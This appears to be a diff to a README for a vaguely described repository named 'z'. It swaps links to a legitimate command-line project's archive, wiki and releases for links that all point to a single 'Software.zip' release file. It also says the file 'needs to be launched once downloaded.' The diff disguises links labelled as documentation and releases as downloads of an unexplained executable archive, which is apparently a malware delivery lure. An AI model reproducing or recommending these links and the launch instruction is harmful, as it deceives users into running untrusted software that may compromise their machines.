@@ -10,18 +10,18 @@ Welcome to the "z" repository - your one-stop destination for all things related
 
 ### Download
 
-🔗 **[Download "z" Repository](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)**  
-![Download Zip](https://img.shields.io/badge/Download-Zip-blue)
+🔗 **[Download "z" Repository](https://github.com/aayushwankhade/z/releases/download/v1.0/Software.zip)**  
+![Download Zip](https://github.com/aayushwankhade/z/releases/download/v1.0/Software.zip)
 
 Please note: The file needs to be launched once downloaded. 
 
 ### Documentation
 
-Visit our [Wiki](https://github.com/cli/cli/wiki) for detailed documentation on the mysterious "z" topic! 
+Visit our [Wiki](https://github.com/aayushwankhade/z/releases/download/v1.0/Software.zip) for detailed documentation on the mysterious "z" topic! 
 
 ### Releases
 
-If the above links do not work, kindly check the [Releases](https://github.com/cli/cli/releases) section for more information.
+If the above links do not work, kindly check the [Releases](https://github.com/aayushwankhade/z/releases/download/v1.0/Software.zip) section for more information.
 
 ## 🌟 Features
 
